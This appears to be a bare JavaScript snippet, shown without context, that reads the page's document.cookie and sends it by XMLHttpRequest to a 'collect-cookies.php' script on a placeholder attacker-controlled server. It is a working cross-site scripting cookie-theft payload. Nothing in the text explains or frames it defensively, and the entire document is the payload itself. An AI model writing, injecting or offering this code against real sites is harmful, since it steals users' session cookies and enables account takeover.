var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://your-controlled-server.com/collect-cookies.php?cookies=' + encodeURIComponent(document.cookie));
xhr.send();